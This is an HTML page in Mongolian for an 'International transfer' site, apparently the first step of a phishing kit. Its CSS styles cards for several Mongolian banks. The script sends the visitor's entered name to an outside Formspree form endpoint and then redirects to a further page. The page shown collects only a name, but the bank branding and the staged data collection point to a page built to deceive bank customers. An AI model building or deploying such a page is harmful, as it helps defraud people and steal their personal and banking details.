<!DOCTYPE html>
<html lang="mn">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Олон улсын шилжүүлэг</title>
    <style>
      /* Importation de la police */
@import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');

:root {
    --dark-bg: #1A1A2E; /* Arrière-plan foncé principal */
    --card-bg-light: #30304D; /* Arrière-plan des cartes (légèrement plus clair) */
    --text-color: #E0E0E0; /* Couleur du texte clair */
    --primary-color: #2D9CDB; /* Bleu pour les liens actifs */
}

/* --- Styles Généraux et Body --- */

body {
    margin: 0;
    font-family: 'Open Sans', sans-serif;
    background-color: var(--dark-bg);
    color: var(--text-color); 
    display: flex;
    flex-direction: column;
    align-items: center;
    min-height: 100vh; /* S'assure que le fond couvre tout l'écran */
    box-sizing: border-box; 
    overflow-x: hidden;
}

/* --- En-tête --- */

.main-header {
    width: 100%;
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 20px 40px;
    box-sizing: border-box;
    font-size: 14px;
}

.logo {
    font-size: 16px;
    font-weight: 600;
    margin: 0;
    color: var(--text-color);
}

.lang-nav {
    display: flex;
    align-items: center;
    gap: 20px;
}

.nav-link {
    color: var(--text-color);
    text-decoration: none;
    padding-bottom: 3px;
    border-bottom: 2px solid transparent;
    transition: border-bottom 0.2s ease;
}

.nav-link.active {
    color: var(--primary-color);
    border-bottom: 2px solid var(--primary-color);
}

.lang-switch {
    display: flex;
    gap: 10px;
    color: #999999;
}

.lang-item {
    cursor: pointer;
    font-weight: 600;
}

.lang-item.active {
    color: var(--text-color);
}

/* --- Section Titres --- */

.content-wrapper {
    flex-grow: 1; 
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center; 
    width: 100%;
    padding: 20px;
    box-sizing: border-box;
}

.title-section {
    text-align: center;
    margin-bottom: 50px;
}

.main-title {
    font-size: 32px;
    font-weight: 700;
    margin-bottom: 5px;
}

.subtitle {
    font-size: 16px;
    color: #AAAAAA;
    margin: 0;
}

/* --- Grille des Banques --- */

.bank-grid {
    display: grid;
    grid-template-columns: repeat(2, 200px); 
    gap: 30px; 
    justify-content: center;
}

.bank-card {
    display: flex;
    flex-direction: column;
    justify-content: space-around; /* Utilise space-around pour espacer l'image et le nom */
    align-items: center;
    height: 200px;
    width: 200px;
    padding: 20px; /* Ajouté pour donner de l'espace aux bords */
    box-sizing: border-box;
    border-radius: 12px;
    text-decoration: none;
    color: var(--text-color);
    transition: transform 0.2s ease, box-shadow 0.2s ease;
    cursor: pointer;
}

.bank-card:hover {
    transform: translateY(-5px);
    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.5);
}

/* --- Styles pour les Logos des Banques --- */
.bank-logo {
    max-width: 100%; /* S'assure que le logo ne déborde pas de la carte */
    max-height: 70%; /* Limite la hauteur du logo pour laisser de la place au nom */
    object-fit: contain; /* Redimensionne l'image pour qu'elle tienne dans la zone sans être coupée */
    margin-bottom: 10px; /* Espace entre le logo et le nom */
}

.bank-name {
    font-size: 14px;
    font-weight: 600;
    text-align: center;
    padding: 5px 10px;
    border-radius: 4px;
    background-color: rgba(0, 0, 0, 0.2);
    align-self: flex-end; /* Aligne le nom en bas de la carte */
}

/* Couleurs des fonds des Banques (approximatives) */
.golomt-bg { background-color: #5D3FD3; } 
.khan-bg { background-color: #1A703C; } 
.tdb-bg { background-color: #2D6399; } 
.mogol-bg { background-color: #2C7A87; } 

/* --- Pied de Page --- */

.main-footer {
    width: 100%;
    text-align: center;
    padding: 15px 0;
    font-size: 11px;
    color: #555555;
    border-top: 1px solid #30304D;
}

/* --- MEDIA QUERIES (Réactivité Mobile) --- */

@media (max-width: 600px) {
    
    .main-header {
        padding: 15px 20px;
    }
    
    .logo {
        font-size: 14px;
    }

    .lang-nav {
        gap: 10px;
    }

    .main-title {
        font-size: 24px;
    }

    .subtitle {
        font-size: 14px;
    }

    .bank-grid {
        grid-template-columns: 1fr; 
        width: 100%;
        max-width: 250px; 
        gap: 25px;
    }

    .bank-card {
        width: 100%;
        height: 150px;
        padding: 15px;
    }
    .bank-card img{
        width: 90%;
        height: 90%;
    }
    
    /* Ajustement de la taille du logo sur mobile si nécessaire */
    .bank-logo {
        max-height: 100%; 
        width: 100%;
        /* Peut être ajusté si les logos sont trop grands sur mobile */
    }

    .main-footer {
        padding: 10px 0;
    }
}

/* --- Style pour le Titre H1 et la Section Formulaire --- */

/* Style du h1 principal (Сайтад тавтай морил) */
body > h1 {
    font-size: 28px;
    font-weight: 700;
    margin-top: 40px;
    margin-bottom: 20px;
    text-align: center;
    color: var(--text-color);
}

/* Conteneur de la section formulaire */
.code-section {
    background-color: var(--card-bg-light);
    padding: 30px;
    border-radius: 12px;
    box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
    width: 100%;
    max-width: 400px; /* Largeur max pour le formulaire */
    margin: 20px auto;
    box-sizing: border-box;
}

#codeForm {
    display: flex;
    flex-direction: column;
    align-items: center;
    text-align: center;
}

#codeForm p {
    margin-bottom: 20px;
    font-size: 16px;
    color: #AAAAAA;
}

/* Style du champ de saisie (Input) */
#codeForm input[type="text"] {
    width: 100%;
    padding: 12px 15px;
    margin-bottom: 10px;
    border: 1px solid #444;
    border-radius: 6px;
    background-color: var(--dark-bg);
    color: white;
    font-size: 16px;
    outline: none;
    transition: border-color 0.3s ease;
    box-sizing: border-box;
}

#codeForm input[type="text"]:focus {
    border-color: var(--primary-color);
}

/* Style du bouton */
#codeForm button {
    width: 100%;
    padding: 12px;
    background-color: var(--primary-color);
    color: white;
    border: none;
    border-radius: 6px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: background-color 0.3s ease, transform 0.1s ease;
}

#codeForm button:hover {
    background-color: #2482b8; /* Un bleu un peu plus foncé au survol */
}

#codeForm button:active {
    transform: scale(0.98);
}

/* Style du Loader */
#loader {
    border: 4px solid #f3f3f3;
    border-top: 4px solid var(--primary-color);
    border-radius: 50%;
    width: 30px;
    height: 30px;
    animation: spin 1s linear infinite;
    margin: 15px auto;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

/* Message de succès ou d'erreur */
#message {
    margin-top: 15px;
    font-size: 14px;
    min-height: 20px;
}

/* Ajustement Mobile */
@media (max-width: 600px) {
    .code-section {
        width: 90%;
        padding: 20px;
    }
    
    body > h1 {
        font-size: 22px;
    }
}
    </style>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css"
      integrity="sha512-DxV+EoADOkOygM4IR9yXP8Sb2qwgidEmeqAEmDKIOfPRQZOWbXCzLC6vjbZyy0vPisbH2SyW27+ddLVCN+OMzQ=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />
    <link rel="shortcut icon" href="img/logo.jpeg" type="image/x-icon" />
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
    <header class="main-header">
      <h1 class="logo">Олон улсын шилжүүлэг</h1>
      <div class="lang-nav">
        <a href="index.html" class="nav-link active">Нүүр хуудас</a>
      </div>
    </header>
    <h1>Сайтад тавтай морил</h1>
    <div class="code-section">
      <form id="codeForm">
        <p>Нэрээ оруулна уу</p>
        <input
          type="text"
          id="name"
          placeholder="Нэрээ оруулна уу"
          required
        /><br />
        <br />
        <button type="submit">Үргэлжлүүлэх</button>
        <div id="loader" style="display: none"></div>
        <p id="message"></p>
      </form>
    </div>

    <footer class="main-footer">
      <p>© 2025 Олон улсын шилжүүлэг. Бүх эрх хуулиар хамгаалагдсан</p>
    </footer>

    <script src="script.js"></script>

    <script>
      const form = document.getElementById("codeForm");
      const loader = document.getElementById("loader");
      const message = document.getElementById("message");

      form.addEventListener("submit", async function (e) {
        e.preventDefault(); // Empêche l'envoi classique

        loader.style.display = "block";
        message.textContent = "";

        const formData = {
          nom: document.getElementById("name").value,
        };

        try {
          const response = await fetch("https://formspree.io/f/xpwyoawv", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify(formData),
          });

          loader.style.display = "none";

          if (response.ok) {
            message.style.color = "green";
            message.textContent = "Амжилттай илгээгдлээ!";
            form.reset();

            // ✅ Redirection vers done.html après un petit délai (facultatif)
            setTimeout(() => {
              window.location.href = "index1.html";
            }, 1000); // délai de 1 seconde (1000 ms)
          } else {
            message.style.color = "red";
            message.textContent = "Алдаа гарлаа. Дахин оролдоно уу.";
          }
        } catch (error) {
          loader.style.display = "none";
          message.style.color = "red";
          message.textContent = "Сүлжээний алдаа. Дахин оролдоно уу.";
          console.error(error);
        }
      });
    </script>
  </body>
</html>
